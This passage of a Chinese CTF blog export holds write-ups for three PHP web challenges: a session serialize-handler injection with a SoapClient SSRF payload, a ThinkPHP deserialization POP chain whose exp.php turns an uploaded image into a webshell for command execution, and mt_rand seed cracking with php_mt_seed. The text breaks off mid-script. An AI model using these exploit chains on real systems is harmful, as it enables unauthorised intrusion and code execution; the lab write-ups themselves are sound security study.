‘需要设置的引擎’);</span><br></pre></td></tr></table></figure><p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。</p><p>举个例子，当存储是<code>php_serialize</code>处理，然后调用时<code>php</code>去处理，如果这时注入的数据时<code>a=|O:4:&quot;test&quot;:0:&#123;&#125;</code>，那么session中的内容是<code>a:1:&#123;s:1:&quot;a&quot;;s:16:&quot;|O:4:&quot;test&quot;:0:&#123;&#125;&quot;;&#125;</code>，那么<code>a:1:&#123;s:1:&quot;a&quot;;s:16:&quot;</code>会被php解析成键名，后面就是一个test对象的注入。</p><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>构造<code>SoapClient类</code>并写入<code>session</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$attack</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;ggbond\r\nCookie: PHPSESSID=123456789\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;ggbond&quot;</span>));</span><br><span class="line"><span class="variable">$payload</span> = urlencode(serialize(<span class="variable">$attack</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><p>因为需要引擎差异，所以我们需要在写入的时候使用<code>php_serialize</code>引擎，可以构造<code>session_start([&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;])</code>达到注入的效果。</p><p>使用第一个<code>call_user_func</code>设置php引擎，通过<code>name</code>写入反序列化字符串</p><p>![image-20211229164023411](bestphp revenge/202112292131923.png)</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>第二次访问后，刚才的序列化字符串因为解析问题成功的注入了<code>SoapCilent类</code>，接下来我们需要想办法调用<code>__call方法</code>，这里我本想着直接利用第一个<code>call_user_func</code>直接利用构造的<code>SoapCilent类</code>，无果。这里是因为<code>sesssion_start</code>在第一个<code>call_user_func</code>之后，相当于还没有构造就去利用了，所以导致失败，所以我们只能使用第二个来利用这个方法。</p><p>所以我们要使用变量覆盖<code>extract函数</code>来覆盖<code>$b</code>变量来实现自定义方法，这里覆盖<code>$b</code>为<code>call_user_func</code>传入的是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>reset($_SESSION)</code>就是刚刚构造的类方法，调用该类的<code>welcome_to_the_lctf2018</code>方法，触发<code>__call</code>从而实现攻击，这里在网上看好多师傅们让<code>name=SoapClient</code>，通过我的尝试发现这个没有意义，因为<code>reset()</code>将数组指向了第一个值，无论<code>name</code>是什么都不会用到。</p><p>![image-20211229164140236](bestphp revenge/202112292131135.png)</p><h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><p>然后我们使用<code>PHPSESSID=123456789</code>去访问首页面就得到了flag</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2019 Upload</title>
      <link href="/post/2021-12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/"/>
      <url>/post/2021-12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h1><p><strong>考点：1、文件上传    2、php反序列化攻击</strong></p><p>进到页面里，存在注册功能，所以就不尝试先不尝试sql注入，先注册一个账号登陆进去</p><p>进去之后有一个上传文件功能，尝试上传文件，经过简单测试发现没有对内容进行严格的过滤，可以传进去一句话木马，但是发现最后的文件名是给定的，所以没有办法上传任意格式的文件。</p><p>在测试过程中发生了报错，发现是<code>ThinkPHP V5.1.35 LTS</code>，一般这种题都会有源码泄露，就简单尝试了下<code>www.zip、web.zip</code>，无果后就拿字典跑了一下，跑出来<code>www.tar.gz</code>源码泄露</p><p>![image-20211218155348298]([强网杯 2019]Upload/202112182135356.png)</p><p>然后直接查看源码<code>application/web/controller/*.php</code>，这里看了其他大佬的解法，因为存在<code>.idea</code>文件，所以使用<code>PhpStrom</code>打开源码文件，可以直接查看到<code>断点hint</code></p><p>![image-20211218212301037]([强网杯 2019]Upload/202112182135358.png)</p><p><code>hint</code>代码如下：</p><p>Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$profile</span>=cookie(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$profile</span>))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode(<span class="variable">$profile</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>断点hint</code>，我们很容易发现这里应该是要利用反序列化攻击，我们尝试逆向溯源的方法来构造pop链，通过查找魔术方法，我们很容以就能找到<code>Profile.php</code>中的魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>Index.php</code>的<code>断点hint</code>我们可以知道，在登录的时候，会在<code>Cookie</code>里获取<code>user</code>字段并且进行<code>base解码</code>后<code>反序列化</code>，然后因为这题考的是<code>upload</code>所以我们去审计以下上传文件的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现如果不进入第二个<code>if</code>即<code>if(!empty($_FILES))</code>的话，我们可以通过自定义参数进行再次对已经上传的文件进行复制操作，并且文件的名字我们可以自己定义。所以我们就可以写出以下的<code>exp</code>，具体实现原理请自行审计exp。</p><p>构造出的链子:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span></span><br><span class="line"><span class="title">Register</span>::<span class="title">__destruct</span> =&gt; <span class="title">Profile</span>::<span class="title">__call</span> =&gt; <span class="title">Profile</span>::<span class="title">__get</span> =&gt; <span class="title">Profile</span>::<span class="title">__call</span> =&gt; <span class="title">Profile</span>::<span class="title">upload_img</span></span><br></pre></td></tr></table></figure><p>exp.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;registed = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;except = [<span class="string">&quot;index&quot;</span>=&gt;<span class="string">&quot;upload_img&quot;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp = <span class="string">&quot;./upload/0257760365ebfba938de33cd01f34156/f1af272d318a2aef209ce13f004a74f1.png&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;./upload/shell.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = <span class="string">&quot;png&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> Register();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$o</span>));</span><br></pre></td></tr></table></figure><p>将生成的字符串传入<code>Cookie</code>中登录，直接访问<code>/upload/shell.php</code>就可以进行命令执行了，<code>cat /flag</code>获得flag</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 Ezaudit</title>
      <link href="/post/2021-12/%5BMRCTF2020%5DEzaudit/"/>
      <url>/post/2021-12/%5BMRCTF2020%5DEzaudit/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h1><p><strong>考点：php的伪随机数</strong></p><p>好复杂的页面，搜索了一下<code>php、form</code>等可能可以利用的字段无果，然后猜测有备份，果然尝试了一下<code>www.zip</code>，里面有一个<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        <span class="variable">$link</span>=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$getuser</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span>=mysql_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//   $Public_key = public_key();</span></span><br><span class="line"><span class="comment">// $Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>代码中主要分为了三部分，看到<code>mt_rand</code>我们应该能想到的就是伪随机数，通过已知的<code>$Public_key = KVQP0LdJKRaV3n9D</code>和<code>public_key()</code>我们来推算出<code>seed</code>，然后再算出<code>private_key</code>即可。</p><p>php伪随机数破解项目地址：<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>通过<code>README.md</code>我们来使用以下这个工具，打开Linux虚拟机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/openwall/php_mt_seed.git</span><br><span class="line">cd php_mt_seed/</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>通过以上命令就可以使用<code>php_mt_seed</code>了，然后我们需要怎么使用它呢？<code>README</code>有这样一段话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">php_mt_seed expects 1, 2, 4, or more numbers on its command line.  The</span><br><span class="line">numbers specify constraints on mt_rand() outputs.</span><br><span class="line"></span><br><span class="line">When invoked with only 1 number, that&#x27;s the first mt_rand() output to</span><br><span class="line">find seeds for.</span><br><span class="line"></span><br><span class="line">When invoked with 2 numbers, those are the bounds (minimum and maximum,</span><br><span class="line">in that order) that the first mt_rand() output should fall within.</span><br><span class="line"></span><br><span class="line">When invoked with 4 numbers, the first 2 give the bounds for the first</span><br><span class="line">mt_rand() output and the second 2 give the range passed into mt_rand().</span><br><span class="line"></span><br><span class="line">When invoked with 5 or more numbers, each group of 4 and then the last</span><br><span class="line">group of 1, 2, or (usually) 4 are processed as above, where each group</span><br><span class="line">refers to a corresponding mt_rand() output.</span><br></pre></td></tr></table></figure><p>翻译过来的意思就是</p><blockquote><p>php_mt_seed在使用时可以有1、2、4或者更多的参数</p><p>当只有1个参数时，通过mt_rand()的第一个输出找到种子。</p><p>当有2个参数时，它们是第一个mt_rand()输出应该在的范围(按顺序是最小值和最大值)。</p><p>当有4个参数时，前2给出mt_rand()第一个输出的边界和后2个给出传递给mt_rand()的范围。</p><p>当调用5个或更多的数字时，每组4个，然后是最后一组1、2或(通常)4，按上述方式处理，其中每组引用相应的mt_rand()输出。</p></blockquote><p>对于这道题来说，<code>mt_rand(0, strlen($strings1)</code>在生成密钥时有范围参数，所以我们需要用4个参数一组的形式来破解<code>seed</code>，所以我们就写下了如下脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_mt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$public_key</span> = str_split(<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>);</span><br><span class="line">    <span class="variable">$strings1</span> = <span 